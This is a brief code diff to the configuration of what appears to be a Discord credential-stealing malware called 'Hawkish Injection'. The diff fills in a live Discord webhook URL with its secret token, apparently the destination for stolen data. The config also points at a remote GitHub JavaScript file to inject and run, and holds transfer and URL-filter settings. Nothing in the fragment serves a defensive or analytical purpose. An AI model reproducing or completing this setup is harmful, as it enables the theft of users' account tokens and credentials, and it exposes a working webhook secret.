@@ -20,7 +20,7 @@ var config = {
     creator: "%NAME_CREATOR%",
     transfer_link: `%TRANSFER_URL%`,
     injection_url: "https://raw.githubusercontent.com/Hawkish-Team/Hawkish-Injection/main/index.js",
-    webhook: "%WEBHOOK%",
+    webhook: "https://discord.com/api/webhooks/1103439320590856225/QoQl3jD28iebttf6qWk43YaiOMlVPD1LEepY-zjJdmogEj1Ws-3DLdZcxv-03aU5UFHl",
     Placed: "%API_URL%",
     Filter: {
         "urls": [
